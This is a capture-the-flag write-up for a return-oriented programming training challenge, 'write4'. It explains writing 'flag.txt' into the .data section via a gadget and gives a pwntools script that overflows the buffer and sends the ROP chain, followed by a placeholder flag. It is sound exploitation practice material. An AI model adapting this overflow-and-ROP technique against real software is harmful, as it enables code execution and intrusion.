# 🔑 Write-Up

The description tells us what to do. We hava a symbol called `usefulGadgets` that contains a trivial write-what-where. We can use `__libc_csu_init+96` in order to initialize the required registers (`r14` and `r15`). Last thing we miss is finding a place where we can write the required string flag.txt and read it back when calling `print_file`. A good candidate is the `.data` section of the ELF because it's both readable and writable.

```python
from pwn import *

context.binary = "./write4"
r = ROP(context.binary)
p = process()
dst = context.binary.get_section_by_name(".data").header.sh_addr
r(r14=dst, r15=b"flag.txt")
r.usefulGadgets()
r.print_file(dst)
print(r.dump())
p.send(b"A" * 40 + r.chain())
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```

### 🚩 Flag

```plain
ROPE{a_placeholder_32byte_flag!}
```